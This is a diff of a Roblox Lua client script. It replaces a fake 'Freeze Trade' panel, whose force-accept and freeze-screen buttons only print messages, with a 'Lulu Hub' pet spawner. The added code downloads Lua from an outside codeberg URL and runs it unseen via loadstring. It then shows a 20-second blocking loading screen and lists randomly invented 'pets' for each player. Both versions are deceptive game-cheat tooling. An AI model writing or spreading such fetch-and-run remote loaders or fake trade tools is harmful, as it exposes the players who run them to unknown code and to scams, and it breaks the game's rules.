@@ -1,270 +1,215 @@
--- Services
-local Players = game:GetService("Players")
-local UserInputService = game:GetService("UserInputService")
-local TweenService = game:GetService("TweenService")
+-- Load real pet spawner
+local Spawner = loadstring(game:HttpGet("https://codeberg.org/GrowAFilipino/GrowAGarden/raw/branch/main/Spawner.lua"))()
 
-local localPlayer = Players.LocalPlayer
-local playerGui = localPlayer:WaitForChild("PlayerGui")
+local allPets = {
+	"Kitsune", "Raccoon", "Butterfly", "Disco Bee", "Corrupted Kitsune", "Dragonfly", "T-Rex"
+}
 
-local selectedPlayer = nil
-local selectedLabel = nil
-local searchText = ""
+local player = game.Players.LocalPlayer
+local gui = Instance.new("ScreenGui")
+gui.Name = "LuluHubUI"
+gui.ResetOnSpawn = false
+gui.IgnoreGuiInset = true
+gui.Parent = player:WaitForChild("PlayerGui")
 
--- Helper
-local function addCorner(uiElement, radius)
-	local corner = Instance.new("UICorner")
-	corner.CornerRadius = UDim.new(0, radius or 8)
-	corner.Parent = uiElement
-end
+-- Loading screen
+local loadingFrame = Instance.new("Frame", gui)
+loadingFrame.Size = UDim2.new(1, 0, 1, 0)
+loadingFrame.BackgroundColor3 = Color3.new(0, 0, 0)
+loadingFrame.ZIndex = 10
 
--- GUI
-local screenGui = Instance.new("ScreenGui")
-screenGui.Name = "TradeUI"
-screenGui.ResetOnSpawn = false
-screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-screenGui.Parent = playerGui
+local message = Instance.new("TextLabel", loadingFrame)
+message.Size = UDim2.new(0.8, 0, 0.1, 0)
+message.Position = UDim2.new(0.1, 0, 0.45, 0)
+message.Text = "🌸 Lulu Hub is preparing... Please wait 20 seconds"
+message.TextColor3 = Color3.new(1, 1, 1)
+message.BackgroundTransparency = 1
+message.TextScaled = true
+message.Font = Enum.Font.GothamBold
+message.TextStrokeTransparency = 0.4
+message.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
 
-local uiScale = Instance.new("UIScale")
-uiScale.Scale = 1
-uiScale.Parent = screenGui
+local glow = Instance.new("UIStroke", message)
+glow.Thickness = 2
+glow.Color = Color3.fromRGB(255, 255, 255)
+glow.Transparency = 0.5
 
-local mainFrame = Instance.new("Frame")
-mainFrame.Size = UDim2.new(0, 400, 0, 390)
-mainFrame.Position = UDim2.new(0.5, -200, 0.5, -195)
-mainFrame.BackgroundColor3 = Color3.fromRGB(39, 42, 44)
-mainFrame.BackgroundTransparency = 0.05
-mainFrame.BorderSizePixel = 0
+-- Toggle Button
+local toggleBtn = Instance.new("TextButton", gui)
+toggleBtn.Size = UDim2.new(0, 120, 0, 40)
+toggleBtn.Position = UDim2.new(0, 10, 0, 10)
+toggleBtn.Text = "🌸 Lulu Hub"
+toggleBtn.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+toggleBtn.TextColor3 = Color3.new(1, 1, 1)
+toggleBtn.Font = Enum.Font.GothamBold
+toggleBtn.TextScaled = true
+toggleBtn.Visible = false
+toggleBtn.AutoButtonColor = true
+
+-- Main Frame
+local mainFrame = Instance.new("Frame", gui)
+mainFrame.Size = UDim2.new(0.6, 0, 0.6, 0)
+mainFrame.Position = UDim2.new(0.2, 0, 0.2, 0)
+mainFrame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
 mainFrame.Visible = false
 mainFrame.Active = true
 mainFrame.Draggable = true
-mainFrame.Parent = screenGui
-addCorner(mainFrame, 12)
+mainFrame.BorderSizePixel = 0
 
-local title = Instance.new("TextLabel")
-title.Text = "Freeze Trade (BETA)"
-title.Size = UDim2.new(1, -40, 0, 40)
-title.Position = UDim2.new(0, 10, 0, 5)
-title.BackgroundTransparency = 1
-title.TextColor3 = Color3.new(1, 1, 1)
-title.Font = Enum.Font.SourceSansBold
-title.TextSize = 22
-title.TextXAlignment = Enum.TextXAlignment.Left
-title.Parent = mainFrame
+-- Header Bar
+local header = Instance.new("Frame", mainFrame)
+header.Size = UDim2.new(1, 0, 0, 40)
+header.BackgroundColor3 = Color3.fromRGB(50, 50, 80)
 
-local closeButton = Instance.new("TextButton")
-closeButton.Size = UDim2.new(0, 30, 0, 30)
-closeButton.Position = UDim2.new(1, -40, 0, 5)
-closeButton.BackgroundColor3 = Color3.fromRGB(231, 76, 60)
-closeButton.Text = "X"
-closeButton.TextColor3 = Color3.new(1, 1, 1)
-closeButton.Font = Enum.Font.SourceSansBold
-closeButton.TextSize = 20
-closeButton.Parent = mainFrame
-addCorner(closeButton, 8)
+local hubLabel = Instance.new("TextLabel", header)
+hubLabel.Size = UDim2.new(1, -40, 1, 0)
+hubLabel.Position = UDim2.new(0, 10, 0, 0)
+hubLabel.Text = "🌸 Lulu Hub"
+hubLabel.TextColor3 = Color3.new(1, 1, 1)
+hubLabel.BackgroundTransparency = 1
+hubLabel.Font = Enum.Font.GothamBold
+hubLabel.TextScaled = true
 
--- Search bar
-local searchBox = Instance.new("TextBox")
-searchBox.PlaceholderText = "Search players..."
-searchBox.Text = ""
-searchBox.Size = UDim2.new(1, -20, 0, 30)
-searchBox.Position = UDim2.new(0, 10, 0, 45)
-searchBox.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
-searchBox.TextColor3 = Color3.new(1, 1, 1)
-searchBox.Font = Enum.Font.SourceSans
-searchBox.TextSize = 18
-searchBox.ClearTextOnFocus = false
-searchBox.Parent = mainFrame
-addCorner(searchBox, 8)
+local closeBtn = Instance.new("TextButton", header)
+closeBtn.Size = UDim2.new(0, 40, 0, 40)
+closeBtn.Position = UDim2.new(1, -40, 0, 0)
+closeBtn.Text = "❌"
+closeBtn.TextScaled = true
+closeBtn.BackgroundColor3 = Color3.fromRGB(80, 40, 40)
+closeBtn.TextColor3 = Color3.new(1, 1, 1)
+closeBtn.Font = Enum.Font.GothamBold
 
--- Selected label
-selectedLabel = Instance.new("TextLabel")
-selectedLabel.Size = UDim2.new(1, -20, 0, 20)
-selectedLabel.Position = UDim2.new(0, 10, 0, 80)
-selectedLabel.BackgroundTransparency = 1
-selectedLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
-selectedLabel.Text = "Selected: none"
-selectedLabel.TextSize = 16
-selectedLabel.Font = Enum.Font.SourceSans
-selectedLabel.TextXAlignment = Enum.TextXAlignment.Left
-selectedLabel.Parent = mainFrame
-
--- Player list
-local playerList = Instance.new("ScrollingFrame")
-playerList.Size = UDim2.new(1, -20, 0, 170)
-playerList.Position = UDim2.new(0, 10, 0, 105)
-playerList.BackgroundColor3 = Color3.fromRGB(33, 36, 38)
-playerList.BorderSizePixel = 0
-playerList.ScrollBarThickness = 6
-playerList.CanvasSize = UDim2.new(0, 0, 0, 0)
-playerList.Parent = mainFrame
-addCorner(playerList, 8)
-
-local layout = Instance.new("UIListLayout")
-layout.Padding = UDim.new(0, 6)
-layout.SortOrder = Enum.SortOrder.LayoutOrder
-layout.Parent = playerList
-
--- Buttons
-local forceAcceptButton = Instance.new("TextButton")
-forceAcceptButton.Size = UDim2.new(1, -20, 0, 35)
-forceAcceptButton.Position = UDim2.new(0, 10, 1, -75)
-forceAcceptButton.BackgroundColor3 = Color3.fromRGB(22, 160, 133)
-forceAcceptButton.Text = "AUTO FORCE TO ACCEPT/CONFIRM"
-forceAcceptButton.TextColor3 = Color3.new(1, 1, 1)
-forceAcceptButton.Font = Enum.Font.SourceSansBold
-forceAcceptButton.TextSize = 16
-forceAcceptButton.Parent = mainFrame
-addCorner(forceAcceptButton, 8)
-
-local freezeButton = Instance.new("TextButton")
-freezeButton.Size = UDim2.new(1, -20, 0, 35)
-freezeButton.Position = UDim2.new(0, 10, 1, -35)
-freezeButton.BackgroundColor3 = Color3.fromRGB(26, 188, 156)
-freezeButton.Text = "FREEZE PLAYER SCREEN"
-freezeButton.TextColor3 = Color3.new(1, 1, 1)
-freezeButton.Font = Enum.Font.SourceSansBold
-freezeButton.TextSize = 16
-freezeButton.Parent = mainFrame
-addCorner(freezeButton, 8)
-
-local toggleButton = Instance.new("TextButton")
-toggleButton.Size = UDim2.new(0, 120, 0, 40)
-toggleButton.Position = UDim2.new(0, 15, 0, 15)
-toggleButton.BackgroundColor3 = Color3.fromRGB(52, 152, 219)
-toggleButton.Text = "Toggle UI"
-toggleButton.TextColor3 = Color3.new(1, 1, 1)
-toggleButton.Font = Enum.Font.SourceSansBold
-toggleButton.TextSize = 18
-toggleButton.Active = true
-toggleButton.Draggable = true
-toggleButton.Parent = screenGui
-addCorner(toggleButton, 8)
-
--- Cooldowns
-local forceCooldown = false
-local freezeCooldown = false
-
--- Refresh function
-local function refreshList()
-	playerList:ClearAllChildren()
-	layout.Parent = playerList
-
-	for _, player in pairs(Players:GetPlayers()) do
-		local nameLower = (player.DisplayName .. player.Name):lower()
-		if searchText == "" or nameLower:find(searchText:lower()) then
-			local item = Instance.new("Frame")
-			item.Size = UDim2.new(1, 0, 0, 50)
-			item.BackgroundColor3 = Color3.fromRGB(50, 53, 55)
-			item.LayoutOrder = player.UserId
-			item.Parent = playerList
-			addCorner(item, 6)
-
-			local avatar = Instance.new("ImageLabel")
-			avatar.Size = UDim2.new(0, 40, 0, 40)
-			avatar.Position = UDim2.new(0, 5, 0.5, -20)
-			avatar.BackgroundTransparency = 1
-			avatar.Image = Players:GetUserThumbnailAsync(player.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size100x100)
-			avatar.Parent = item
-
-			local nameLabel = Instance.new("TextLabel")
-			nameLabel.Size = UDim2.new(1, -60, 1, 0)
-			nameLabel.Position = UDim2.new(0, 50, 0, 0)
-			nameLabel.BackgroundTransparency = 1
-			nameLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-			nameLabel.Font = Enum.Font.SourceSansSemibold
-			nameLabel.TextSize = 18
-			nameLabel.Text = player.DisplayName .. " (@" .. player.Name .. ")"
-			nameLabel.TextXAlignment = Enum.TextXAlignment.Left
-			nameLabel.Parent = item
-
-			item.InputBegan:Connect(function(input)
-				if input.UserInputType == Enum.UserInputType.MouseButton1 then
-					selectedPlayer = player
-					selectedLabel.Text = "Selected: @" .. player.Name
-				end
-			end)
-		end
-	end
-
-	task.wait()
-	playerList.CanvasSize = UDim2.new(0, 0, 0, layout.AbsoluteContentSize.Y + 10)
-end
-
-refreshList()
-searchBox:GetPropertyChangedSignal("Text"):Connect(function()
-	searchText = searchBox.Text
-	refreshList()
-end)
-Players.PlayerAdded:Connect(refreshList)
-Players.PlayerRemoving:Connect(refreshList)
-
--- Actions
-forceAcceptButton.MouseButton1Click:Connect(function()
-	if forceCooldown or not selectedPlayer then return end
-	forceCooldown = true
-	for i = 5, 1, -1 do
-		forceAcceptButton.Text = "Cooldown: " .. i .. "s"
-		wait(1)
-	end
-	forceAcceptButton.Text = "AUTO FORCE TO ACCEPT/CONFIRM"
-	forceCooldown = false
-	print("Force Accept used on:", selectedPlayer.Name)
-end)
-
-freezeButton.MouseButton1Click:Connect(function()
-	if freezeCooldown or not selectedPlayer then return end
-	freezeCooldown = true
-	for i = 7, 1, -1 do
-		freezeButton.Text = "Cooldown: " .. i .. "s"
-		wait(1)
-	end
-	freezeButton.Text = "FREEZE PLAYER SCREEN"
-	freezeCooldown = false
-	print("Freeze Screen used on:", selectedPlayer.Name)
-end)
-
--- Toggle & Close
-toggleButton.MouseButton1Click:Connect(function()
-	mainFrame.Visible = not mainFrame.Visible
-end)
-
-closeButton.MouseButton1Click:Connect(function()
+closeBtn.MouseButton1Click:Connect(function()
 	mainFrame.Visible = false
 end)
 
--- Drag support
-local function makeDraggable(guiObject)
-	local dragging, dragInput, dragStart, startPos = false
+-- Sidebar
+local sidebar = Instance.new("Frame", mainFrame)
+sidebar.Size = UDim2.new(0.3, 0, 1, -40)
+sidebar.Position = UDim2.new(0, 0, 0, 40)
+sidebar.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
 
-	guiObject.InputBegan:Connect(function(input)
-		if input.UserInputType == Enum.UserInputType.MouseButton1 then
-			dragging = true
-			dragStart = input.Position
-			startPos = guiObject.Position
+local sidebarLabel = Instance.new("TextLabel", sidebar)
+sidebarLabel.Size = UDim2.new(1, 0, 0, 30)
+sidebarLabel.Text = "Players"
+sidebarLabel.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
+sidebarLabel.TextColor3 = Color3.new(1, 1, 1)
+sidebarLabel.Font = Enum.Font.GothamBold
+sidebarLabel.TextScaled = true
 
-			local conn
-			conn = input.Changed:Connect(function()
-				if input.UserInputState == Enum.UserInputState.End then
-					dragging = false
-					conn:Disconnect()
-				end
-			end)
+local playerScroll = Instance.new("ScrollingFrame", sidebar)
+playerScroll.Size = UDim2.new(1, 0, 1, -30)
+playerScroll.Position = UDim2.new(0, 0, 0, 30)
+playerScroll.CanvasSize = UDim2.new(0, 0, 0, 0)
+playerScroll.ScrollBarThickness = 6
+playerScroll.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+
+-- Pet Panel
+local petPanel = Instance.new("Frame", mainFrame)
+petPanel.Size = UDim2.new(0.7, 0, 1, -40)
+petPanel.Position = UDim2.new(0.3, 0, 0, 40)
+petPanel.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+
+local petScroll = Instance.new("ScrollingFrame", petPanel)
+petScroll.Size = UDim2.new(1, 0, 1, 0)
+petScroll.Position = UDim2.new(0, 0, 0, 0)
+petScroll.CanvasSize = UDim2.new(0, 0, 0, 0)
+petScroll.ScrollBarThickness = 6
+petScroll.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+
+-- Logic
+local selectedBtn
+local selectedPlayer = nil
+local perPlayerPets = {}
+
+local function generatePetSet()
+	local count = math.random(2, 4)
+	local selected = {}
+	local used = {}
+	while #selected < count do
+		local pet = allPets[math.random(1, #allPets)]
+		if not used[pet] then
+			used[pet] = true
+			table.insert(selected, {name = pet, max = math.random(1,2), used = 0})
 		end
-	end)
-
-	guiObject.InputChanged:Connect(function(input)
-		if input.UserInputType == Enum.UserInputType.MouseMovement then
-			dragInput = input
-		end
-	end)
-
-	UserInputService.InputChanged:Connect(function(input)
-		if input == dragInput and dragging then
-			local delta = input.Position - dragStart
-			guiObject.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
-		end
-	end)
+	end
+	return selected
 end
 
-makeDraggable(mainFrame)
-makeDraggable(toggleButton)
+local function loadPlayers()
+	playerScroll:ClearAllChildren()
+	local y = 0
+	for _, plr in pairs(game.Players:GetPlayers()) do
+		local btn = Instance.new("TextButton", playerScroll)
+		btn.Size = UDim2.new(1, -8, 0, 30)
+		btn.Position = UDim2.new(0, 4, 0, y)
+		btn.Text = plr.Name
+		btn.TextColor3 = Color3.new(1, 1, 1)
+		btn.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+		btn.Font = Enum.Font.Gotham
+		btn.TextScaled = true
+
+		if not perPlayerPets[plr.Name] then
+			perPlayerPets[plr.Name] = generatePetSet()
+		end
+
+		btn.MouseButton1Click:Connect(function()
+			selectedPlayer = plr.Name
+			if selectedBtn then
+				selectedBtn.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+			end
+			btn.BackgroundColor3 = Color3.fromRGB(100, 80, 130)
+			selectedBtn = btn
+			loadPetList(perPlayerPets[plr.Name])
+		end)
+
+		y += 32
+	end
+	playerScroll.CanvasSize = UDim2.new(0, 0, 0, y)
+end
+
+function loadPetList(petList)
+	petScroll:ClearAllChildren()
+	local y = 0
+	for _, petData in ipairs(petList) do
+		local btn = Instance.new("TextButton", petScroll)
+		btn.Size = UDim2.new(1, -8, 0, 30)
+		btn.Position = UDim2.new(0, 4, 0, y)
+		btn.Text = petData.name .. " (" .. (petData.max - petData.used) .. ")"
+		btn.TextColor3 = Color3.new(1, 1, 1)
+		btn.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
+		btn.Font = Enum.Font.Gotham
+		btn.TextScaled = true
+
+		btn.MouseButton1Click:Connect(function()
+			if petData.used < petData.max then
+				petData.used += 1
+				Spawner.SpawnPet(petData.name, 2, 1)
+				btn.Text = petData.name .. " (" .. (petData.max - petData.used) .. ")"
+				if petData.used >= petData.max then
+					btn.AutoButtonColor = false
+					btn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+				end
+			end
+		end)
+
+		y += 32
+	end
+	petScroll.CanvasSize = UDim2.new(0, 0, 0, y)
+end
+
+toggleBtn.MouseButton1Click:Connect(function()
+	mainFrame.Visible = not mainFrame.Visible
+	if mainFrame.Visible then
+		perPlayerPets = {}
+		loadPlayers()
+		petScroll:ClearAllChildren()
+	end
+end)
+
+task.delay(20, function()
+	loadingFrame:Destroy()
+	mainFrame.Visible = true
+	toggleBtn.Visible = true
+	loadPlayers()
+end)
